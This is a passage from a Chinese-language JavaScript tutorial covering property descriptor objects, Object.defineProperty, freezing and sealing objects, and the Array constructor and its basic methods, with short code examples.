   目前，主要有三个对象自定义了 ``toLocaleString`` 方法。

   - Array.prototype.toLocaleString()
   - Number.prototype.toLocaleString()
   - Date.prototype.toLocaleString()

   举例来说，日期的实例对象的 ``toString`` 和 ``toLocaleString`` 返回值就不一样，而且 ``toLocaleString`` 的返回值跟用户设定的所在地域相关。

   .. code:: javascript

      var date = new Date();
      date.toString() // "Tue Jan 01 2018 12:01:33 GMT+0800 (CST)"
      date.toLocaleString() // "1/01/2018, 12:01:33 PM"

Object.prototype.hasOwnProperty()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Object.prototype.hasOwnProperty`` 方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。

   .. code:: javascript

      var obj = {
        p: 123
      };
   
      obj.hasOwnProperty('p') // true
      obj.hasOwnProperty('toString') // false

   上面代码中，对象 ``obj`` 自身具有 ``p`` 属性，所以返回 ``true`` 。 ``toString`` 属性是继承的，所以返回 ``false`` 。

参考链接
-------

   - Axel Rauschmayer, [Protecting objects in JavaScript](http://www.2ality.com/2013/08/protecting-objects.html)
   - kangax, [Understanding delete](http://perfectionkills.com/understanding-delete/)
   - Jon Bretman, [Type Checking in JavaScript](http://techblog.badoo.com/blog/2013/11/01/type-checking-in-javascript/)
   - Cody Lindley, [Thinking About ECMAScript 5 Parts](http://tech.pro/tutorial/1671/thinking-about-ecmascript-5-parts)
   - Bjorn Tipling, [Advanced objects in JavaScript](http://bjorn.tipling.com/advanced-objects-in-javascript)
   - Javier Márquez, [JavaScript properties are enumerable, writable and configurable](http://arqex.com/967/javascript-properties-enumerable-writable-configurable)
   - Sella Rafaeli, [Native JavaScript Data-Binding](http://www.sellarafaeli.com/blog/native_javascript_data_binding): 使用存取函数实现model与view的双向绑定
   - Lea Verou, [Copying object properties, the robust way](http://lea.verou.me/2015/08/copying-properties-the-robust-way/)

/🟠 属性描述对象
==============

概述
---

   JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。

   下面是属性描述对象的一个例子。

   .. code:: javascript

      {
        value: 123,
        writable: false,
        enumerable: true,
        configurable: false,
        get: undefined,
        set: undefined
      }

   属性描述对象提供6个元属性。

   （1） ``value`` 

    ``value`` 是该属性的属性值，默认为 ``undefined`` 。

   （2） ``writable`` 

    ``writable`` 是一个布尔值，表示属性值（value）是否可改变（即是否可写），默认为 ``true`` 。

   （3） ``enumerable`` 

    ``enumerable`` 是一个布尔值，表示该属性是否可遍历，默认为 ``true`` 。如果设为 ``false`` ，会使得某些操作（比如 ``for...in`` 循环、 ``Object.keys()`` ）跳过该属性。

   （4） ``configurable`` 

    ``configurable`` 是一个布尔值，表示属性的可配置性，默认为 ``true`` 。如果设为 ``false`` ，将阻止某些操作改写属性描述对象，比如无法删除该属性，也不得改变各种元属性（ ``value`` 属性除外）。也就是说， ``configurable`` 属性控制了属性描述对象的可写性。

   （5） ``get`` 

    ``get`` 是一个函数，表示该属性的取值函数（getter），默认为 ``undefined`` 。

   （6） ``set`` 

    ``set`` 是一个函数，表示该属性的存值函数（setter），默认为 ``undefined`` 。

Object.getOwnPropertyDescriptor()
----------------------------------

    ``Object.getOwnPropertyDescriptor()`` 方法可以获取属性描述对象。它的第一个参数是目标对象，第二个参数是一个字符串，对应目标对象的某个属性名。

   .. code:: javascript

      var obj = { p: 'a' };
   
      Object.getOwnPropertyDescriptor(obj, 'p')
      // Object { value: "a",
      //   writable: true,
      //   enumerable: true,
      //   configurable: true
      // }

   上面代码中， ``Object.getOwnPropertyDescriptor()`` 方法获取 ``obj.p`` 的属性描述对象。

   注意， ``Object.getOwnPropertyDescriptor()`` 方法只能用于对象自身的属性，不能用于继承的属性。

   .. code:: javascript

      var obj = { p: 'a' };
   
      Object.getOwnPropertyDescriptor(obj, 'toString')
      // undefined

   上面代码中， ``toString`` 是 ``obj`` 对象继承的属性， ``Object.getOwnPropertyDescriptor()`` 无法获取。

Object.getOwnPropertyNames()
-----------------------------

    ``Object.getOwnPropertyNames`` 方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。

   .. code:: javascript

      var obj = Object.defineProperties({}, {
        p1: { value: 1, enumerable: true },
        p2: { value: 2, enumerable: false }
      });
   
      Object.getOwnPropertyNames(obj)
      // ["p1", "p2"]

   上面代码中， ``obj.p1`` 是可遍历的， ``obj.p2`` 是不可遍历的。 ``Object.getOwnPropertyNames`` 会将它们都返回。

   这跟 ``Object.keys`` 的行为不同， ``Object.keys`` 只返回对象自身的可遍历属性的全部属性名。

   .. code:: javascript

      Object.keys([]) // []
      Object.getOwnPropertyNames([]) // [ 'length' ]
   
      Object.keys(Object.prototype) // []
      Object.getOwnPropertyNames(Object.prototype)
      // ['hasOwnProperty',
      //  'valueOf',
      //  'constructor',
      //  'toLocaleString',
      //  'isPrototypeOf',
      //  'propertyIsEnumerable',
      //  'toString']

   上面代码中，数组自身的 ``length`` 属性是不可遍历的， ``Object.keys`` 不会返回该属性。第二个例子的 ``Object.prototype`` 也是一个对象，所有实例对象都会继承它，它自身的属性都是不可遍历的。

Object.defineProperty()，Object.defineProperties()
--------------------------------------------------

    ``Object.defineProperty()`` 方法允许通过属性描述对象，定义或修改一个属性，然后返回修改后的对象，它的用法如下。

   .. code:: javascript

      Object.defineProperty(object, propertyName, attributesObject)

    ``Object.defineProperty`` 方法接受三个参数，依次如下。

   - object：属性所在的对象
   - propertyName：字符串，表示属性名
   - attributesObject：属性描述对象

   举例来说，定义 ``obj.p`` 可以写成下面这样。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        value: 123,
        writable: false,
        enumerable: true,
        configurable: false
      });
   
      obj.p // 123
   
      obj.p = 246;
      obj.p // 123

   上面代码中， ``Object.defineProperty()`` 方法定义了 ``obj.p`` 属性。由于属性描述对象的 ``writable`` 属性为 ``false`` ，所以 ``obj.p`` 属性不可写。注意，这里的 ``Object.defineProperty`` 方法的第一个参数是 ``{}`` （一个新建的空对象）， ``p`` 属性直接定义在这个空对象上面，然后返回这个对象，这是 ``Object.defineProperty()`` 的常见用法。

   如果属性已经存在， ``Object.defineProperty()`` 方法相当于更新该属性的属性描述对象。

   如果一次性定义或修改多个属性，可以使用 ``Object.defineProperties()`` 方法。

   .. code:: javascript

      var obj = Object.defineProperties({}, {
        p1: { value: 123, enumerable: true },
        p2: { value: 'abc', enumerable: true },
        p3: { get: function () { return this.p1 + this.p2 },
          enumerable:true,
          configurable:true
        }
      });
   
      obj.p1 // 123
      obj.p2 // "abc"
      obj.p3 // "123abc"

   上面代码中， ``Object.defineProperties()`` 同时定义了 ``obj`` 对象的三个属性。其中， ``p3`` 属性定义了取值函数 ``get`` ，即每次读取该属性，都会调用这个取值函数。

   注意，一旦定义了取值函数 ``get`` （或存值函数 ``set`` ），就不能将 ``writable`` 属性设为 ``true`` ，或者同时定义 ``value`` 属性，否则会报错。

   .. code:: javascript

      var obj = {};
   
      Object.defineProperty(obj, 'p', {
        value: 123,
        get: function() { return 456; }
      });
      // TypeError: Invalid property.
      // A property cannot both have accessors and be writable or have a value
   
      Object.defineProperty(obj, 'p', {
        writable: true,
        get: function() { return 456; }
      });
      // TypeError: Invalid property descriptor.
      // Cannot both specify accessors and a value or writable attribute

   上面代码中，同时定义了 ``get`` 属性和 ``value`` 属性，以及将 ``writable`` 属性设为 ``true`` ，就会报错。

    ``Object.defineProperty()`` 和 ``Object.defineProperties()`` 参数里面的属性描述对象， ``writable`` 、 ``configurable`` 、 ``enumerable`` 这三个属性的默认值都为 ``false`` 。

   .. code:: javascript

      var obj = {};
      Object.defineProperty(obj, 'foo', {});
      Object.getOwnPropertyDescriptor(obj, 'foo')
      // {
      //   value: undefined,
      //   writable: false,
      //   enumerable: false,
      //   configurable: false
      // }

   上面代码中，定义 ``obj.foo`` 时用了一个空的属性描述对象，就可以看到各个元属性的默认值。

Object.prototype.propertyIsEnumerable()
----------------------------------------

   实例对象的 ``propertyIsEnumerable()`` 方法返回一个布尔值，用来判断某个属性是否可遍历。注意，这个方法只能用于判断对象自身的属性，对于继承的属性一律返回 ``false`` 。

   .. code:: javascript

      var obj = {};
      obj.p = 123;
   
      obj.propertyIsEnumerable('p') // true
      obj.propertyIsEnumerable('toString') // false

   上面代码中， ``obj.p`` 是可遍历的，而 ``obj.toString`` 是继承的属性。

元属性
-----

   属性描述对象的各个属性称为“元属性”，因为它们可以看作是控制属性的属性。

value
~~~~~~

    ``value`` 属性是目标属性的值。

   .. code:: javascript

      var obj = {};
      obj.p = 123;
   
      Object.getOwnPropertyDescriptor(obj, 'p').value
      // 123
   
      Object.defineProperty(obj, 'p', { value: 246 });
      obj.p // 246

   上面代码是通过 ``value`` 属性，读取或改写 ``obj.p`` 的例子。

writable
~~~~~~~~~

    ``writable`` 属性是一个布尔值，决定了目标属性的值（value）是否可以被改变。

   .. code:: javascript

      var obj = {};
   
      Object.defineProperty(obj, 'a', {
        value: 37,
        writable: false
      });
   
      obj.a // 37
      obj.a = 25;
      obj.a // 37

   上面代码中， ``obj.a`` 的 ``writable`` 属性是 ``false`` 。然后，改变 ``obj.a`` 的值，不会有任何效果。

   注意，正常模式下，对 ``writable`` 为 ``false`` 的属性赋值不会报错，只会默默失败。但是，严格模式下会报错，即使对 ``a`` 属性重新赋予一个同样的值。

   .. code:: javascript

      'use strict';
      var obj = {};
   
      Object.defineProperty(obj, 'a', {
        value: 37,
        writable: false
      });
   
      obj.a = 37;
      // Uncaught TypeError: Cannot assign to read only property 'a' of object

   上面代码是严格模式，对 ``obj.a`` 任何赋值行为都会报错。

   如果原型对象的某个属性的 ``writable`` 为 ``false`` ，那么子对象将无法自定义这个属性。

   .. code:: javascript

      var proto = Object.defineProperty({}, 'foo', {
        value: 'a',
        writable: false
      });
   
      var obj = Object.create(proto);
   
      obj.foo = 'b';
      obj.foo // 'a'

   上面代码中， ``proto`` 是原型对象，它的 ``foo`` 属性不可写。 ``obj`` 对象继承 ``proto`` ，也不可以再自定义这个属性了。如果是严格模式，这样做还会抛出一个错误。

   但是，有一个规避方法，就是通过覆盖属性描述对象，绕过这个限制。原因是这种情况下，原型链会被完全忽视。

   .. code:: javascript

      var proto = Object.defineProperty({}, 'foo', {
        value: 'a',
        writable: false
      });
   
      var obj = Object.create(proto);
      Object.defineProperty(obj, 'foo', {
        value: 'b'
      });
   
      obj.foo // "b"

enumerable
~~~~~~~~~~~

    ``enumerable`` （可遍历性）返回一个布尔值，表示目标属性是否可遍历。

   JavaScript 的早期版本， ``for...in`` 循环是基于 ``in`` 运算符的。我们知道， ``in`` 运算符不管某个属性是对象自身的还是继承的，都会返回 ``true`` 。

   .. code:: javascript

      var obj = {};
      'toString' in obj // true

   上面代码中， ``toString`` 不是 ``obj`` 对象自身的属性，但是 ``in`` 运算符也返回 ``true`` ，这导致了 ``toString`` 属性也会被 ``for...in`` 循环遍历。

   这显然不太合理，后来就引入了“可遍历性”这个概念。只有可遍历的属性，才会被 ``for...in`` 循环遍历，同时还规定 ``toString`` 这一类实例对象继承的原生属性，都是不可遍历的，这样就保证了 ``for...in`` 循环的可用性。

   具体来说，如果一个属性的 ``enumerable`` 为 ``false`` ，下面三个操作不会取到该属性。

   -  ``for..in`` 循环
   -  ``Object.keys`` 方法
   -  ``JSON.stringify`` 方法

   因此， ``enumerable`` 可以用来设置“秘密”属性。

   .. code:: javascript

      var obj = {};
   
      Object.defineProperty(obj, 'x', {
        value: 123,
        enumerable: false
      });
   
      obj.x // 123
   
      for (var key in obj) {
        console.log(key);
      }
      // undefined
   
      Object.keys(obj)  // []
      JSON.stringify(obj) // "{}"

   上面代码中， ``obj.x`` 属性的 ``enumerable`` 为 ``false`` ，所以一般的遍历操作都无法获取该属性，使得它有点像“秘密”属性，但不是真正的私有属性，还是可以直接获取它的值。

   注意， ``for...in`` 循环包括继承的属性， ``Object.keys`` 方法不包括继承的属性。如果需要获取对象自身的所有属性，不管是否可遍历，可以使用 ``Object.getOwnPropertyNames`` 方法。

   另外， ``JSON.stringify`` 方法会排除 ``enumerable`` 为 ``false`` 的属性，有时可以利用这一点。如果对象的 JSON 格式输出要排除某些属性，就可以把这些属性的 ``enumerable`` 设为 ``false`` 。

configurable
~~~~~~~~~~~~~

    ``configurable`` (可配置性）返回一个布尔值，决定了是否可以修改属性描述对象。也就是说， ``configurable`` 为 ``false`` 时， ``writable`` 、 ``enumerable`` 和 ``configurable`` 都不能被修改了。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        value: 1,
        writable: false,
        enumerable: false,
        configurable: false
      });
   
      Object.defineProperty(obj, 'p', {writable: true})
      // TypeError: Cannot redefine property: p
   
      Object.defineProperty(obj, 'p', {enumerable: true})
      // TypeError: Cannot redefine property: p
   
      Object.defineProperty(obj, 'p', {configurable: true})
      // TypeError: Cannot redefine property: p
   
      Object.defineProperty(obj, 'p', {value: 2})
      // TypeError: Cannot redefine property: p

   上面代码中， ``obj.p`` 的 ``configurable`` 属性为 ``false`` 。然后，改动 ``writable`` 、 ``enumerable`` 、 ``configurable`` ，结果都报错。

   注意， ``writable`` 属性只有在 ``false`` 改为 ``true`` 时会报错， ``true`` 改为 ``false`` 是允许的。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        writable: true,
        configurable: false
      });
   
      Object.defineProperty(obj, 'p', {writable: false})
      // 修改成功

    ``value`` 属性的情况比较特殊。只要 ``writable`` 和 ``configurable`` 有一个为 ``true`` ，就允许改动 ``value`` 。

   .. code:: javascript

      var o1 = Object.defineProperty({}, 'p', {
        value: 1,
        writable: true,
        configurable: false
      });
   
      Object.defineProperty(o1, 'p', {value: 2})
      // 修改成功
   
      var o2 = Object.defineProperty({}, 'p', {
        value: 1,
        writable: false,
        configurable: true
      });
   
      Object.defineProperty(o2, 'p', {value: 2})
      // 修改成功

   另外， ``writable`` 为 ``false`` 时，直接对目标属性赋值，不报错，但不会成功。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        value: 1,
        writable: false,
        configurable: false
      });
   
      obj.p = 2;
      obj.p // 1

   上面代码中， ``obj.p`` 的 ``writable`` 为 ``false`` ，对 ``obj.p`` 直接赋值不会生效。如果是严格模式，还会报错。

   可配置性决定了目标属性是否可以被删除（delete）。

   .. code:: javascript

      var obj = Object.defineProperties({}, {
        p1: { value: 1, configurable: true },
        p2: { value: 2, configurable: false }
      });
   
      delete obj.p1 // true
      delete obj.p2 // false
   
      obj.p1 // undefined
      obj.p2 // 2

   上面代码中， ``obj.p1`` 的 ``configurable`` 是 ``true`` ，所以可以被删除， ``obj.p2`` 就无法删除。

存取器
-----

   除了直接定义以外，属性还可以用存取器（accessor）定义。其中，存值函数称为 ``setter`` ，使用属性描述对象的 ``set`` 属性；取值函数称为 ``getter`` ，使用属性描述对象的 ``get`` 属性。

   一旦对目标属性定义了存取器，那么存取的时候，都将执行对应的函数。利用这个功能，可以实现许多高级特性，比如定制属性的读取和赋值行为。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        get: function () {
          return 'getter';
        },
        set: function (value) {
          console.log('setter: ' + value);
        }
      });
   
      obj.p // "getter"
      obj.p = 123 // "setter: 123"

   上面代码中， ``obj.p`` 定义了 ``get`` 和 ``set`` 属性。 ``obj.p`` 取值时，就会调用 ``get`` ；赋值时，就会调用 ``set`` 。

   JavaScript 还提供了存取器的另一种写法。

   .. code:: javascript

      // 写法二
      var obj = {
        get p() {
          return 'getter';
        },
        set p(value) {
          console.log('setter: ' + value);
        }
      };

   上面两种写法，虽然属性 ``p`` 的读取和赋值行为是一样的，但是有一些细微的区别。第一种写法，属性 ``p`` 的 ``configurable`` 和 ``enumerable`` 都为 ``false`` ，从而导致属性 ``p`` 是不可遍历的；第二种写法，属性 ``p`` 的 ``configurable`` 和 ``enumerable`` 都为 ``true`` ，因此属性 ``p`` 是可遍历的。实际开发中，写法二更常用。

   注意，取值函数 ``get`` 不能接受参数，存值函数 ``set`` 只能接受一个参数（即属性的值）。

   存取器往往用于，属性的值依赖对象内部数据的场合。

   .. code:: javascript

      var obj ={
        $n : 5,
        get next() { return this.$n++ },
        set next(n) {
          if (n >= this.$n) this.$n = n;
          else throw new Error('新的值必须大于当前值');
        }
      };
   
      obj.next // 5
   
      obj.next = 10;
      obj.next // 10
   
      obj.next = 5;
      // Uncaught Error: 新的值必须大于当前值

   上面代码中， ``next`` 属性的存值函数和取值函数，都依赖于内部属性 ``$n`` 。

对象的拷贝
--------

   有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现。

   .. code:: javascript

      var extend = function (to, from) {
        for (var property in from) {
          to[property] = from[property];
        }
   
        return to;
      }
   
      extend({}, {
        a: 1
      })
      // {a: 1}

   上面这个方法的问题在于，如果遇到存取器定义的属性，会只拷贝值。

   .. code:: javascript

      extend({}, {
        get a() { return 1 }
      })
      // {a: 1}

   为了解决这个问题，我们可以通过 ``Object.defineProperty`` 方法来拷贝属性。

   .. code:: javascript

      var extend = function (to, from) {
        for (var property in from) {
          if (!from.hasOwnProperty(property)) continue;
          Object.defineProperty(
            to,
            property,
            Object.getOwnPropertyDescriptor(from, property)
          );
        }
   
        return to;
      }
   
      extend({}, { get a(){ return 1 } })
      // { get a(){ return 1 } })

   上面代码中， ``hasOwnProperty`` 那一行用来过滤掉继承的属性，否则可能会报错，因为 ``Object.getOwnPropertyDescriptor`` 读不到继承属性的属性描述对象。

控制对象状态
----------

   有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是 ``Object.preventExtensions`` ，其次是 ``Object.seal`` ，最强的是 ``Object.freeze`` 。

Object.preventExtensions()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Object.preventExtensions`` 方法可以使得一个对象无法再添加新的属性。

   .. code:: javascript

      var obj = new Object();
      Object.preventExtensions(obj);
   
      Object.defineProperty(obj, 'p', {
        value: 'hello'
      });
      // TypeError: Cannot define property:p, object is not extensible.
   
      obj.p = 1;
      obj.p // undefined

   上面代码中， ``obj`` 对象经过 ``Object.preventExtensions`` 以后，就无法添加新属性了。

Object.isExtensible()
~~~~~~~~~~~~~~~~~~~~~~

    ``Object.isExtensible`` 方法用于检查一个对象是否使用了 ``Object.preventExtensions`` 方法。也就是说，检查是否可以为一个对象添加属性。

   .. code:: javascript

      var obj = new Object();
   
      Object.isExtensible(obj) // true
      Object.preventExtensions(obj);
      Object.isExtensible(obj) // false

   上面代码中，对 ``obj`` 对象使用 ``Object.preventExtensions`` 方法以后，再使用 ``Object.isExtensible`` 方法，返回 ``false`` ，表示已经不能添加新属性了。

Object.seal()
~~~~~~~~~~~~~~

    ``Object.seal`` 方法使得一个对象既无法添加新属性，也无法删除旧属性。

   .. code:: javascript

      var obj = { p: 'hello' };
      Object.seal(obj);
   
      delete obj.p;
      obj.p // "hello"
   
      obj.x = 'world';
      obj.x // undefined

   上面代码中， ``obj`` 对象执行 ``Object.seal`` 方法以后，就无法添加新属性和删除旧属性了。

    ``Object.seal`` 实质是把属性描述对象的 ``configurable`` 属性设为 ``false`` ，因此属性描述对象不再能改变了。

   .. code:: javascript

      var obj = {
        p: 'a'
      };
   
      // seal方法之前
      Object.getOwnPropertyDescriptor(obj, 'p')
      // Object {
      //   value: "a",
      //   writable: true,
      //   enumerable: true,
      //   configurable: true
      // }
   
      Object.seal(obj);
   
      // seal方法之后
      Object.getOwnPropertyDescriptor(obj, 'p')
      // Object {
      //   value: "a",
      //   writable: true,
      //   enumerable: true,
      //   configurable: false
      // }
   
      Object.defineProperty(obj, 'p', {
        enumerable: false
      })
      // TypeError: Cannot redefine property: p

   上面代码中，使用 ``Object.seal`` 方法之后，属性描述对象的 ``configurable`` 属性就变成了 ``false`` ，然后改变 ``enumerable`` 属性就会报错。

    ``Object.seal`` 只是禁止新增或删除属性，并不影响修改某个属性的值。

   .. code:: javascript

      var obj = { p: 'a' };
      Object.seal(obj);
      obj.p = 'b';
      obj.p // 'b'

   上面代码中， ``Object.seal`` 方法对 ``p`` 属性的 ``value`` 无效，是因为此时 ``p`` 属性的可写性由 ``writable`` 决定。

Object.isSealed()
~~~~~~~~~~~~~~~~~~

    ``Object.isSealed`` 方法用于检查一个对象是否使用了 ``Object.seal`` 方法。

   .. code:: javascript

      var obj = { p: 'a' };
   
      Object.seal(obj);
      Object.isSealed(obj) // true

   这时， ``Object.isExtensible`` 方法也返回 ``false`` 。

   .. code:: javascript

      var obj = { p: 'a' };
   
      Object.seal(obj);
      Object.isExtensible(obj) // false

Object.freeze()
~~~~~~~~~~~~~~~~

    ``Object.freeze`` 方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。

   .. code:: javascript

      var obj = {
        p: 'hello'
      };
   
      Object.freeze(obj);
   
      obj.p = 'world';
      obj.p // "hello"
   
      obj.t = 'hello';
      obj.t // undefined
   
      delete obj.p // false
      obj.p // "hello"

   上面代码中，对 ``obj`` 对象进行 ``Object.freeze()`` 以后，修改属性、新增属性、删除属性都无效了。这些操作并不报错，只是默默地失败。如果在严格模式下，则会报错。

Object.isFrozen()
~~~~~~~~~~~~~~~~~~

    ``Object.isFrozen`` 方法用于检查一个对象是否使用了 ``Object.freeze`` 方法。

   .. code:: javascript

      var obj = {
        p: 'hello'
      };
   
      Object.freeze(obj);
      Object.isFrozen(obj) // true

   使用 ``Object.freeze`` 方法以后， ``Object.isSealed`` 将会返回 ``true`` ， ``Object.isExtensible`` 返回 ``false`` 。

   .. code:: javascript

      var obj = {
        p: 'hello'
      };
   
      Object.freeze(obj);
   
      Object.isSealed(obj) // true
      Object.isExtensible(obj) // false

    ``Object.isFrozen`` 的一个用途是，确认某个对象没有被冻结后，再对它的属性赋值。

   .. code:: javascript

      var obj = {
        p: 'hello'
      };
   
      Object.freeze(obj);
   
      if (!Object.isFrozen(obj)) {
        obj.p = 'world';
      }

   上面代码中，确认 ``obj`` 没有被冻结后，再对它的属性赋值，就不会报错了。

局限性
~~~~~

   上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。

   .. code:: javascript

      var obj = new Object();
      Object.preventExtensions(obj);
   
      var proto = Object.getPrototypeOf(obj);
      proto.t = 'hello';
      obj.t
      // hello

   上面代码中，对象 ``obj`` 本身不能新增属性，但是可以在它的原型对象上新增属性，就依然能够在 ``obj`` 上读到。

   一种解决方案是，把 ``obj`` 的原型也冻结住。

   .. code:: javascript

      var obj = new Object();
      Object.preventExtensions(obj);
   
      var proto = Object.getPrototypeOf(obj);
      Object.preventExtensions(proto);
   
      proto.t = 'hello';
      obj.t // undefined

   另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。

   .. code:: javascript

      var obj = {
        foo: 1,
        bar: ['a', 'b']
      };
      Object.freeze(obj);
   
      obj.bar.push('c');
      obj.bar // ["a", "b", "c"]

   上面代码中， ``obj.bar`` 属性指向一个数组， ``obj`` 对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的。

/🟠 Array 对象
==============

构造函数
-------

    ``Array`` 是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组。

   .. code:: javascript

      var arr = new Array(2);
      arr.length // 2
      arr // [ empty x 2 ]

   上面代码中， ``Array()`` 构造函数的参数 ``2`` ，表示生成一个两个成员的数组，每个位置都是空值。

   如果没有使用 ``new`` 关键字，运行结果也是一样的。

   .. code:: javascript

      var arr = Array(2);
      // 等同于
      var arr = new Array(2);

   考虑到语义性，以及与其他构造函数用法保持一致，建议总是加上 ``new`` 。

    ``Array()`` 构造函数有一个很大的缺陷，不同的参数个数会导致不一致的行为。

   .. code:: javascript

      // 无参数时，返回一个空数组
      new Array() // []
   
      // 单个正整数参数，表示返回的新数组的长度
      new Array(1) // [ empty ]
      new Array(2) // [ empty x 2 ]
   
      // 非正整数的数值作为参数，会报错
      new Array(3.2) // RangeError: Invalid array length
      new Array(-3) // RangeError: Invalid array length
   
      // 单个非数值（比如字符串、布尔值、对象等）作为参数，
      // 则该参数是返回的新数组的成员
      new Array('abc') // ['abc']
      new Array([1]) // [Array[1]]
   
      // 多参数时，所有参数都是返回的新数组的成员
      new Array(1, 2) // [1, 2]
      new Array('a', 'b', 'c') // ['a', 'b', 'c']

   可以看到， ``Array()`` 作为构造函数，行为很不一致。因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法。

   .. code:: javascript

      // bad
      var arr = new Array(1, 2);
   
      // good
      var arr = [1, 2];

   注意，如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回 ``undefined`` ，但实际上该位置没有任何值。虽然这时可以读取到 ``length`` 属性，但是取不到键名。

   .. code:: javascript

      var a = new Array(3);
      var b = [undefined, undefined, undefined];
   
      a.length // 3
      b.length // 3
   
      a[0] // undefined
      b[0] // undefined
   
      0 in a // false
      0 in b // true

   上面代码中， ``a`` 是 ``Array()`` 生成的一个长度为3的空数组， ``b`` 是一个三个成员都是 ``undefined`` 的数组，这两个数组是不一样的。读取键值的时候， ``a`` 和 ``b`` 都返回 ``undefined`` ，但是 ``a`` 的键名（成员的序号）都是空的， ``b`` 的键名是有值的。

静态方法
-------


Array.isArray()
~~~~~~~~~~~~~~~~

    ``Array.isArray`` 方法返回一个布尔值，表示参数是否为数组。它可以弥补 ``typeof`` 运算符的不足。

   .. code:: javascript

      var arr = [1, 2, 3];
   
      typeof arr // "object"
      Array.isArray(arr) // true

   上面代码中， ``typeof`` 运算符只能显示数组的类型是 ``Object`` ，而 ``Array.isArray`` 方法可以识别数组。

实例方法
-------


valueOf()，toString()
~~~~~~~~~~~~~~~~~~~~~~

    ``valueOf`` 方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的 ``valueOf`` 方法不尽一致，数组的 ``valueOf`` 方法返回数组本身。

   .. code:: javascript

      var arr = [1, 2, 3];
      arr.valueOf() // [1, 2, 3]

    ``toString`` 方法也是对象的通用方法，数组的 ``toString`` 方法返回数组的字符串形式。

   .. code:: javascript

      var arr = [1, 2, 3];
      arr.toString() // "1,2,3"
   
      var arr = [1, 2, 3, [4, 5, 6]];
      arr.toString() // "1,2,3,4,5,6"

push()，pop()
~~~~~~~~~~~~~~

    ``push`` 方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。

   .. code:: javascript

      var arr = [];
   
      arr.push(1) // 1
      arr.push('a') // 2
      arr.push(true, {}) // 4
      arr // [1, 'a', true, {}]

   上面代码使用 ``push`` 方法，往数组中添加了四个成员。

    ``pop`` 方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组。

   .. code:: javascript

      var arr = ['a', 'b', 'c'];
   
      arr.pop() // 'c'
      arr // ['a', 'b']

   对空数组使用 ``pop`` 方法，不会报错，而是返回 ``undefined`` 。

   .. code:: javascript

      [].pop() // undefined

    ``push`` 和 ``pop`` 结合使用，就构成了“后进先出”的栈结构（stack）。

   .. code:: javascript

      var arr = [];
      arr.push(1, 2);
      arr.push(3);
      arr.pop();
      arr // [1, 2]

   上面代码中， ``3`` 是最后进入数组的，但是最早离开数组。

shift()，unshift()
~~~~~~~~~~~~~~~~~~~

    ``shift()`` 方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
   
      a.shift() // 'a'
      a // ['b', 'c']

   上面代码中，使用 ``shift()`` 方法以后，原数组就变了。

    ``shift()`` 方法可以遍历并清空一个数组。

   .. code:: javascript

      var list = [1, 2, 3, 4];
      var item;
   
      while (item = list.shift()) {
        console.log(item);
      }
   
      list // []

   上面代码通过 ``list.shift()`` 方法每次取出一个元素，从而遍历数组。它的前提是数组元素不能是 ``0`` 或任何布尔值等于 ``false`` 的元素，因此这样的遍历不是很可靠。

    ``push()`` 和 ``shift()`` 结合使用，就构成了“先进先出”的队列结构（queue）。

    ``unshift()`` 方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。

   .. code:: javascript

      var a = ['a', 'b', 'c'];
   
      a.unshift('x'); // 4
      a // ['x', 'a', 'b', 'c']

    ``unshift()`` 方法可以接受多个参数，这些参数都会添加到目标数组头部。

   .. code:: javascript

      var arr = [ 'c', 'd' ];
      arr.unshift('a', 'b') // 4
      arr // [ 'a', 'b', 'c', 'd' ]

join()
~~~~~~~

    ``join()`` 方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。

   .. code:: javascript

      var a = [1, 2, 3, 4];
   
      a.join(' ') // '1 2 3 4'
      a.join(' | ') // "1 | 2 | 3 | 4"
      a.join() // "1,2,3,4"

   如果数组成员是 ``undefined`` 或 ``null`` 或空位，会被转成空字符串。

   .. code:: javascript

      [undefined, null].join('#')
      // '#'
   
      ['a',, 'b'].join('-')
      // 'a--b'

   通过 ``call`` 方法，这个方法也可以用于字符串或类似数组的对象。

   .. code:: javascript

      Array.prototype.join.call('hello', '-')
      // "h-e-l-l-o"
   
      var obj = { 0: 'a', 1: 'b', length: 2 };
      Array.prototype.join.call(obj, '-')
      // 'a-b'

concat()
~~~~~~~~~

    ``concat`` 方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。

   .. code:: javascript

      ['hello'].concat(['world'])
      // ["hello", "world"]
   
      ['hello'].concat(['world'], ['!'])
      // ["hello", "world", "!"]
   
      [].concat({a: 1}, {b: 2})
      // [{ a: 1 }, { b: 2 }]
   
      [2].concat({a: 1})
      // [2, {a: 1}]

   除了数组作为参数， ``concat`` 也接受其他类型的值作为参数，添加到目标数组尾部。

